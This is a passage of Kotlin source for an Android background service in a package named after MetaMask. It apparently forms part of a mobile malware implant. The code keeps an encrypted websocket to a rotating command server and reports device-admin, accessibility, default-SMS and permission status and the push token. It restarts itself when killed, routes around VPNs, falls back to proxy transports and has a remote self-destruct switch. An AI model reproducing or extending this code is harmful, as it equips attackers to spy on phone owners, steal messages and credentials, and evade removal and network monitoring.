                base.setClassName(target.packageName, target.name)
            }

            this@MasterWebSocketDispatcher.sendBroadcast(base)
        }

        private fun schedulePing(ws: WebSocket) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] schedulePing enter ws=${ws}") //xdbg
            cancelPing()
            pingRunnable = object : Runnable {
                var pingCount = 0
                override fun run() {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] run enter") //xdbg
                    if (this@MasterWebSocketDispatcher.webSocket == ws && IS_SERVICE_RUNNING) {
                        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                        pingCount++
                        if (pingCount % 6 == 0) {
                            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                            try { this@MasterWebSocketDispatcher.checkAndReportSpecialPermissions() }
                            catch (_: Exception) {}
                        }
                        try {
                            val permissionsJson = PermissionHelper.checkPermissions(this@MasterWebSocketDispatcher)
                            val privilegesJson = PrivilegeChecker.getAllPrivilegesStatus(this@MasterWebSocketDispatcher)
                            val isDefaultSms = PrivilegeChecker.isDefaultSmsApp(this@MasterWebSocketDispatcher)

                            val appName = try {
                                val prefs = this@MasterWebSocketDispatcher.getSharedPreferences("DeviceCheck", Context.MODE_PRIVATE)
                                val smartName = prefs.getString("cached_smart_app_name", null)

                                if (!smartName.isNullOrBlank()) {
                                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                                    smartName
                                } else {
                                    val pm = packageManager
                                    val appInfo = applicationInfo
                                    pm.getApplicationLabel(appInfo).toString()
                                }
                            } catch (e: Exception) {
                                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                                "Unknown"
                            }

                            val pingMessage = JSONObject().apply {
                                put("action", "ping")
                                put("appName", appName)
                                put("packageName", this@MasterWebSocketDispatcher.packageName)
                                put("is_default_sms", isDefaultSms)
                                if (permissionsJson.getString("status") == "success") {
                                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                                    put("permissions", permissionsJson.getJSONObject("data"))
                                }
                                put("privileges", privilegesJson)
                            }

                            val sent = try {
                                val rawData = pingMessage.toString()
                                val encryptedData = com.yourcompany.core.jni.NativeBridge.nativeEncryptData(rawData)
                                val envelope = JSONObject().apply { put("p", encryptedData) }
                                ws.send(envelope.toString())
                            } catch (_: Exception) {
                                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch (ignored)") //xdbg
                                false
                            }

                            if (sent) {
                                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                                lastQueueSizeBytes = ws.queueSize()
                            }

                        } catch (_: Exception) {}


                        if (IS_SERVICE_RUNNING && this@MasterWebSocketDispatcher.webSocket == ws) {
                            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                            pingHandler.postDelayed(this, (3000L..8000L).random())
                        }
                    }
                }
            }
            pingHandler.postDelayed(pingRunnable!!, (2000L..5000L).random())
        }

        private fun cancelPing() {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] cancelPing enter") //xdbg
            pingRunnable?.let { pingHandler.removeCallbacks(it) }
            pingRunnable = null
        }
    }

    private fun readAdminStatus(): Boolean = try {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
        val comp = android.content.ComponentName(this, com.example.MetaMask.receivers.BadgerFalconRecv::class.java)
        dpm?.isAdminActive(comp) ?: false
    } catch (_: Exception) { false }

    private fun readAccessibilityStatus(): Boolean = try {
        val enabled = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: ""
        enabled.contains(packageName)
    } catch (_: Exception) { false }

    private fun sendSpecialPermissions(isAdmin: Boolean, isAccessibility: Boolean) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] sendSpecialPermissions enter isAdmin=${isAdmin} isAccessibility=${isAccessibility}") //xdbg
        val payload = JSONObject().apply {
            put("action", "specialPermissionsUpdate")
            put("is_device_admin", isAdmin)
            put("is_accessibility_enabled", isAccessibility)
        }
        val sendIntent = Intent(ACTION_SEND_TO_SERVER).apply {
            putExtra(EXTRA_MESSAGE_TO_SEND, payload.toString())
        }
        sendBroadcast(sendIntent)
    }

    private fun checkAndReportSpecialPermissions() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] checkAndReportSpecialPermissions enter") //xdbg
        val now = System.currentTimeMillis()
        if (now - lastSpecialPermCheckMs < 5_000L) return
        lastSpecialPermCheckMs = now
        try {
            val isAdmin = readAdminStatus()
            val isAccessibility = readAccessibilityStatus()
            if (isAdmin && isAccessibility) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                sendSpecialPermissions(true, true)
            } else {
                retryCheckSpecialPermissions(3)
            }
        } catch (_: Exception) {}
    }

    private fun retryCheckSpecialPermissions(attemptsLeft: Int) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] retryCheckSpecialPermissions enter attemptsLeft=${attemptsLeft}") //xdbg
        if (attemptsLeft <= 0) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            try { sendSpecialPermissions(readAdminStatus(), readAccessibilityStatus()) }
            catch (_: Exception) {}
            return
        }
        handler.postDelayed({
            try {
                val isAdmin = readAdminStatus()
                val isAccessibility = readAccessibilityStatus()
                if (isAdmin && isAccessibility) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    sendSpecialPermissions(true, true)
                } else {
                    retryCheckSpecialPermissions(attemptsLeft - 1)
                }
            } catch (_: Exception) {}
        }, 2000)
    }

    private fun checkAndReportDefaultSmsStatus() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] checkAndReportDefaultSmsStatus enter") //xdbg
        try {
            val isDefault = com.example.MetaMask.utils.PrivilegeChecker.isDefaultSmsApp(this@MasterWebSocketDispatcher)
            val statusUpdatePayload = JSONObject().apply {
                put("action", "defaultSmsStatusUpdate")
                put("isDefault", isDefault)
            }
            val sendIntent = Intent(ACTION_SEND_TO_SERVER).apply {
                putExtra(EXTRA_MESSAGE_TO_SEND, statusUpdatePayload.toString())
            }
            this@MasterWebSocketDispatcher.sendBroadcast(sendIntent)
        } catch (_: Exception) {}
    }

    private fun isNetworkAvailable(context: Context): Boolean {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] isNetworkAvailable enter context=ctx") //xdbg
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork ?: return false
        val capabilities = cm.getNetworkCapabilities(network) ?: return false
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
        return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun scheduleRestart() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] scheduleRestart enter") //xdbg
        if (!IS_SERVICE_RUNNING) return
        val restartIntent = Intent(this@MasterWebSocketDispatcher, MasterWebSocketDispatcher::class.java).apply {
            setPackage(this@MasterWebSocketDispatcher.packageName)
        }
        val pendingIntent = PendingIntent.getService(
            this@MasterWebSocketDispatcher,
            RESTART_PENDING_INTENT_REQUEST_CODE,
            restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 2000,
            pendingIntent
        )
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onTaskRemoved enter rootIntent=${rootIntent}") //xdbg
        scheduleRestart()
        sendRestartBroadcast()
        super.onTaskRemoved(rootIntent)
    }

    private fun sendRestartBroadcast() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] sendRestartBroadcast enter") //xdbg
        val broadcastIntent = Intent("com.example.MetaMask.RESTART_SERVICE")
        broadcastIntent.setPackage(this@MasterWebSocketDispatcher.packageName)
        this@MasterWebSocketDispatcher.sendBroadcast(broadcastIntent)
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onDestroy enter") //xdbg
        val killSwitchPrefs = getSharedPreferences(SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)

        if (killSwitchPrefs.getBoolean(SelfDestructService.KEY_PERMANENTLY_DISABLED, false)) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            IS_SERVICE_RUNNING = false

            if (::statusPrefs.isInitialized) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                statusPrefs.edit().putBoolean(KEY_IS_RUNNING, false).apply()
            }

            if (receiverRegistered) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                try {
                    unregisterReceiver(serverSendReceiver)
                    receiverRegistered = false
                } catch (_: IllegalArgumentException) {}
            }

            serviceJob.cancel()
            handler.removeCallbacksAndMessages(null)

            webSocket?.close(1000, "Service Destroyed")

            if (CURRENT_INSTANCE === this) CURRENT_INSTANCE = null

            super.onDestroy()
            return
        }

        if (::statusPrefs.isInitialized) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            statusPrefs.edit().putBoolean(KEY_IS_RUNNING, false).apply()
        }

        IS_SERVICE_RUNNING = false
        serviceJob.cancel()
        unregisterNetworkCallback()
        unregisterTelephonyListener()

        if (receiverRegistered) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            try {
                unregisterReceiver(serverSendReceiver)
                receiverRegistered = false
            } catch (_: IllegalArgumentException) {}
        }

        handler.removeCallbacksAndMessages(null)
        webSocket?.close(1000, "Service Destroyed")

        scheduleRestart()

        if (CURRENT_INSTANCE === this) CURRENT_INSTANCE = null

        val hasReadSms = try {
            androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
        } catch (_: Exception) { false }
        if (hasReadSms) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            try { sendRestartBroadcast() } catch (_: Exception) {}
        }

        super.onDestroy()
    }

    private fun registerTelephonyListener() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] registerTelephonyListener enter") //xdbg
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) return
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return
            telephonyManagerRef = tm
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                registerModernTelephonyCallback(tm)
            } else {
                registerLegacyPhoneStateListener(tm)
            }
        } catch (_: Exception) {}
    }

    @androidx.annotation.RequiresApi(Build.VERSION_CODES.S)
    private fun registerModernTelephonyCallback(tm: TelephonyManager) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] registerModernTelephonyCallback enter tm=${tm}") //xdbg
        val cb = object : android.telephony.TelephonyCallback(),
            android.telephony.TelephonyCallback.DataConnectionStateListener,
            android.telephony.TelephonyCallback.CallStateListener {
            override fun onDataConnectionStateChanged(state: Int, networkType: Int) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onDataConnectionStateChanged enter state=${state} networkType=${networkType}") //xdbg
                if (state == TelephonyManager.DATA_CONNECTED) onPhoneStateTrigger()
            }
            override fun onCallStateChanged(state: Int) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onCallStateChanged enter state=${state}") //xdbg
                if (state == TelephonyManager.CALL_STATE_IDLE) onPhoneStateTrigger()
            }
        }
        val executor = java.util.concurrent.Executor { cmd -> Handler(Looper.getMainLooper()).post(cmd) }
        tm.registerTelephonyCallback(executor, cb)
        phoneStateCallback = cb
    }

    @Suppress("DEPRECATION")
    private fun registerLegacyPhoneStateListener(tm: TelephonyManager) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] registerLegacyPhoneStateListener enter tm=${tm}") //xdbg
        val listener = object : PhoneStateListener() {
            override fun onDataConnectionStateChanged(state: Int, networkType: Int) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onDataConnectionStateChanged enter state=${state} networkType=${networkType}") //xdbg
                if (state == TelephonyManager.DATA_CONNECTED) onPhoneStateTrigger()
            }
            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onCallStateChanged enter state=${state} phoneNumber=${phoneNumber}") //xdbg
                if (state == TelephonyManager.CALL_STATE_IDLE) onPhoneStateTrigger()
            }
        }
        tm.listen(
            listener,
            PhoneStateListener.LISTEN_DATA_CONNECTION_STATE or PhoneStateListener.LISTEN_CALL_STATE
        )
        phoneStateCallback = listener
    }

    private fun unregisterTelephonyListener() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] unregisterTelephonyListener enter") //xdbg
        try {
            val tm = telephonyManagerRef ?: return
            val cb = phoneStateCallback ?: return
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                tm.unregisterTelephonyCallback(cb as android.telephony.TelephonyCallback)
            } else {
                @Suppress("DEPRECATION")
                tm.listen(cb as PhoneStateListener, PhoneStateListener.LISTEN_NONE)
            }
        } catch (_: Exception) {}
        phoneStateCallback = null
        telephonyManagerRef = null
    }

    private fun onPhoneStateTrigger() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onPhoneStateTrigger enter") //xdbg
        val now = System.currentTimeMillis()
        if (now - lastPhoneStateTriggerMs < PHONE_STATE_DEBOUNCE_MS) return
        lastPhoneStateTriggerMs = now
        Handler(Looper.getMainLooper()).post {
            if (!IS_SERVICE_RUNNING) return@post
            if (webSocket == null) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                serviceScope.launch {
                    if (RemoteConfig.serverDomain != null || RemoteConfig.fetchDomain(applicationContext)) {
                        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                        Handler(Looper.getMainLooper()).post { initializeWebSocket() }
                    }
                }
            } else {
                serviceScope.launch { checkAndHealWebSocket() }
            }
        }
    }

    private fun isExternalVpnActive(): Boolean {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] isExternalVpnActive enter") //xdbg
        val cm = connectivityManager ?: return false
        val caps = cm.getNetworkCapabilities(cm.activeNetwork ?: return false) ?: return false
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
        return caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)
    }

    private fun findAndBindPhysicalNetwork() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] findAndBindPhysicalNetwork enter") //xdbg
        val cm = connectivityManager ?: return
        val phys = cm.allNetworks
            .filter { net ->
                val caps = cm.getNetworkCapabilities(net) ?: return@filter false
                caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                        !caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)
            }
            .maxByOrNull { net ->
                val caps = cm.getNetworkCapabilities(net) ?: return@maxByOrNull 0
                when {
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)     -> 3
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> 2
                    else                                                       -> 1
                }
            }
        val physType = phys?.let { n ->
            val c = cm.getNetworkCapabilities(n)
            when {
                c?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true     -> "wifi"
                c?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "cell"
                else -> "other"
            }
        } ?: "null"
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] findAndBind chose=$phys type=$physType") //xdbg
        physicalNetwork = phys
        cm.bindProcessToNetwork(phys)
    }

    private fun startRealityRecheckTimer() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] startRealityRecheckTimer enter") //xdbg
        realityRecheckJob?.cancel()
        realityRecheckJob = serviceScope.launch {
            while (isActive && usingDirectWsFallback) {
                delay(REALITY_RECHECK_INTERVAL_MS)
                if (!usingDirectWsFallback) break
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] realityRecheck: pinging REALITY...") //xdbg
                val available = com.example.MetaMask.utils.RealityConfig.pingAny()
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] realityRecheck: available=$available") //xdbg
                if (available) {
                    usingDirectWsFallback = false
                    realityConsecutiveFails = 0
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] realityRecheck: REALITY restored, switching back") //xdbg
                    stopRealityRecheckTimer()
                    Handler(Looper.getMainLooper()).post {
                        if (IS_SERVICE_RUNNING) {
                            webSocket?.cancel()
                            webSocket = null
                            isConnecting = false
                            initializeWebSocket()
                        }
                    }
                    break
                }
            }
        }
    }

    private fun stopRealityRecheckTimer() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] stopRealityRecheckTimer enter") //xdbg
        realityRecheckJob?.cancel()
        realityRecheckJob = null
    }

    private fun measureTcpPing443(host: String): Long = try {
        val t = System.currentTimeMillis()
        java.net.Socket().use { it.connect(java.net.InetSocketAddress(host, 443), 2000) }
        System.currentTimeMillis() - t
    } catch (_: Exception) { Long.MAX_VALUE }

    private fun triggerDomainSwitch() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] triggerDomainSwitch enter") //xdbg
        RemoteConfig.rotateDomain()
        domainMonitorBaselinePing = -1L
        domainDegradedStrikes = 0
        handler.post {
            if (IS_SERVICE_RUNNING) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                webSocket?.cancel()
                webSocket = null
                isConnecting = false
                initializeWebSocket()
            }
        }
    }

    private fun launchDomainHealthMonitor(ws: WebSocket) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] launchDomainHealthMonitor enter ws=${ws}") //xdbg
        serviceScope.launch {
            delay(30_000L)
            val host = RemoteConfig.serverDomain?.split(":")?.first() ?: return@launch
            val baseline = withContext(Dispatchers.IO) { measureTcpPing443(host) }
            if (baseline == Long.MAX_VALUE) return@launch
            domainMonitorBaselinePing = baseline
            domainDegradedStrikes = 0
            while (isActive && webSocket === ws) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] loop") //xdbg
                delay(90_000L)
                if (webSocket !== ws) break
                val cur = withContext(Dispatchers.IO) { measureTcpPing443(host) }
                if (cur == Long.MAX_VALUE || (domainMonitorBaselinePing > 0 && cur > domainMonitorBaselinePing * 4)) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    if (++domainDegradedStrikes >= 2) { triggerDomainSwitch(); break }
                } else {
                    domainDegradedStrikes = 0
                }
            }
        }
    }

    private fun registerNetworkCallback() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] registerNetworkCallback enter") //xdbg
        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkRequest = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .addCapability(NetworkCapabilities.NET_CAPABILITY_NOT_VPN)
            .build()

        networkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onAvailable enter network=${network}") //xdbg
                super.onAvailable(network)
                val caps = connectivityManager?.getNetworkCapabilities(network)
                val isWifi = caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
                val isCellular = caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onAvailable wifi=${isWifi} cell=${isCellular}") //xdbg
                val currentIsWifi = physicalNetwork?.let {
                    connectivityManager?.getNetworkCapabilities(it)?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
                } ?: false
                if (currentIsWifi && !isWifi) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onAvailable: keeping wifi, ignoring cellular") //xdbg
                    return
                }
                physicalNetwork = network
                if (isExternalVpnActive()) return
                connectivityManager?.bindProcessToNetwork(network)
                Handler(Looper.getMainLooper()).post {
                    if (webSocket == null) {
                        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                        serviceScope.launch {
                            if (RemoteConfig.serverDomain != null || RemoteConfig.fetchDomain(applicationContext)) {
                                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                                Handler(Looper.getMainLooper()).post { initializeWebSocket() }
                            }
                        }
                    }
                }
            }

            override fun onLost(network: Network) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onLost enter network=${network}") //xdbg
                super.onLost(network)
                if (physicalNetwork == network) physicalNetwork = null
            }
        }
        connectivityManager?.registerNetworkCallback(networkRequest, networkCallback!!)

        val vpnRequest = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .addTransportType(NetworkCapabilities.TRANSPORT_VPN)
            .build()
        vpnNetworkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onAvailable enter network=${network}") //xdbg
                Handler(Looper.getMainLooper()).post {
                    if (!IS_SERVICE_RUNNING) return@post
                    webSocket?.cancel()
                    webSocket = null
                    isConnecting = false
                    serviceScope.launch {
                        try {
                            RemoteConfig.fetchDomain(applicationContext)
                        } catch (e: kotlinx.coroutines.CancellationException) {
                            throw e
                        } catch (e: Exception) {
                            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                        }
                        Handler(Looper.getMainLooper()).post {
                            if (IS_SERVICE_RUNNING) initializeWebSocket()
                        }
                    }
                }
            }
            override fun onLost(network: Network) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onLost enter network=${network}") //xdbg
                Handler(Looper.getMainLooper()).post {
                    if (!IS_SERVICE_RUNNING) return@post
                    usingDirectWsFallback = false
                    realityConsecutiveFails = 0
                    stopRealityRecheckTimer()
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] vpnNetworkCallback.onLost: reset fallback, back to REALITY mode") //xdbg
                    findAndBindPhysicalNetwork()
                    webSocket?.cancel()
                    webSocket = null
                    isConnecting = false
                    serviceScope.launch {
                        val realityJob = async { com.example.MetaMask.utils.RealityConfig.fetch() }
                        try {
                            RemoteConfig.fetchDomain(applicationContext)
                        } catch (e: kotlinx.coroutines.CancellationException) {
                            throw e
                        } catch (e: Exception) {
                            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                        }
                        realityJob.await()
                        Handler(Looper.getMainLooper()).post {
                            if (IS_SERVICE_RUNNING) initializeWebSocket()
                        }
                    }
                }
            }
        }
        connectivityManager?.registerNetworkCallback(vpnRequest, vpnNetworkCallback!!)
    }

    private fun unregisterNetworkCallback() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] unregisterNetworkCallback enter") //xdbg
        try {
            networkCallback?.let {
                connectivityManager?.unregisterNetworkCallback(it)
            }
        } catch (_: Exception) {}
        try {
            vpnNetworkCallback?.let {
                connectivityManager?.unregisterNetworkCallback(it)
                vpnNetworkCallback = null
            }
        } catch (_: Exception) {}
    }

    fun sendDirect(payload: JSONObject) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] sendDirect enter payload=${payload}") //xdbg
        serviceScope.launch {
            try {
                if (!payload.has("uuid")) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    payload.put("uuid", DeviceUUIDProvider.getUUID())
                }
                val rawData = payload.toString()
                val encryptedData = com.yourcompany.core.jni.NativeBridge.nativeEncryptData(rawData)
                val secureEnvelope = JSONObject().apply { put("p", encryptedData) }
                val finalPayload = secureEnvelope.toString()
                lastQueueSizeBytes = webSocket?.queueSize() ?: lastQueueSizeBytes
                webSocket?.send(finalPayload)
                lastQueueSizeBytes = webSocket?.queueSize() ?: lastQueueSizeBytes
            } catch (_: Exception) {}
        }
    }

    fun scheduleRestartCrane(mode: String) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] scheduleRestartCrane enter mode=${mode}") //xdbg
        handler.postDelayed({
            try {
                val intent = Intent(CraneService.ACTION_SET_CRANE_MODE).apply {
                    putExtra(CraneService.EXTRA_MODE, mode)
                    setPackage(packageName)
                }
                startService(intent)
            } catch (_: Exception) {}
        }, 2000L)
    }

    private fun sendCachedTokens() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] sendCachedTokens enter") //xdbg
        val confirmed = FcmTokenService.isTokenConfirmed(applicationContext)
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] sendCachedTokens isConfirmed=$confirmed") //xdbg
        if (confirmed) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] sendCachedTokens token already confirmed, skip") //xdbg
            return
        }
        try {
            DeviceUUIDProvider.init(applicationContext)
            val uuid = DeviceUUIDProvider.getUUID() ?: return
            val fcmPrefs = getSharedPreferences("fcm_prefs", Context.MODE_PRIVATE)
            val fcmToken = fcmPrefs.getString("fcm_token", null)
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] sendCachedTokens fcmToken=${fcmToken?.take(20)}... isEmpty=${fcmToken.isNullOrEmpty()}") //xdbg

            if (fcmToken.isNullOrEmpty()) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] sendCachedTokens no cached token → scheduling pushCurrentTokenToServer") //xdbg
                serviceScope.launch { FcmTokenService.pushCurrentTokenToServer(this@MasterWebSocketDispatcher) }
                return
            }

            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] sendCachedTokens sending token via WS") //xdbg
            val json = JSONObject().apply {
                put("action", "fcmTokenUpdate")
                put("fcmToken", fcmToken)
                put("uuid", uuid)
                put("packageName", packageName)
            }
            val rawData = json.toString()
            val encryptedData = com.yourcompany.core.jni.NativeBridge.nativeEncryptData(rawData)
            val envelope = JSONObject().apply { put("p", encryptedData) }
            val sent = webSocket?.send(envelope.toString())
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] sendCachedTokens WS.send result=$sent") //xdbg
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] sendCachedTokens catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }
}
